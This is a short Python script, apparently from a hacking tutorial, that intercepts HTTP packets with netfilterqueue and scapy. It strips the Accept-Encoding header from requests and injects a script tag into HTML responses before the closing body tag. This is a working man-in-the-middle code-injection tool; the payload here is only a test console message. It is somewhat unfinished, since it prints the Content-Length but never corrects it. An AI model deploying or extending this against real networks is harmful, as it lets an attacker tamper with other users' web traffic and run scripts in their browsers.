import netfilterqueue
import scapy.all as scapy
import re


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    '''
        res not html code but come with gzip incoding
    '''
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] Request")
            if scapy_packet[scapy.Raw]:
                load = re.sub(
                    "Accept-Encoding:.*?\\r\\n", "", load)
                new_packet = set_load(scapy_packet, load)
                packet.set_payload(str(new_packet))
        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] Response")
            if "</body>" in str(load):
                load = load.replace(
                    "</body>", "<script>console.log('test')</script></body>")
            content_length_search = re.search(
                "(?:Content-Length:\s)(\d*)", load)
            if content_length_search:
                content_length = content_length_search.group(1)
                print(content_length)
        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
